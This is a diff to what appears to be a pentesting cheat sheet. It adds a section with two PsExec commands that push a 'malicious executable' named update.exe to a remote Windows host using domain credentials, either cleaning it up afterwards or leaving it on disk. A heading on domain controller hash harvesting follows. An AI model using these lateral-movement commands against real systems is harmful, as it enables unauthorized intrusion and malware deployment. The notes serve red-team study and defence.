@@ -369,6 +369,17 @@ tcpdump -r <file> 'src host 8.8.8.8'
 tcpdump -r <file> 'not src host 8.8.8.8'
 tcpdump -r <file> 'icmp and (src host 8.8.8.8'
 ```
+## PSExec'ing:
+
+Running PsExec by uploading malicious executable:
+
+```
+# This will continue the PsExec session through named pipe, and will only terminate once the process is terminated. Additionally this -c parameter will manually cleanup the executable.
+PsExec.exe /accepteula \\192.168.1.2 -u CORP\user -p password -c update.exe
+
+# This will kill the PsExec session and leave the malicious executable on disk
+PsExec.exe /accepteula \\192.168.1.2 -u CORP\user -p password -d update.exe
+```
 
 ## Windows Domain Controller Hash Harvesting:
 
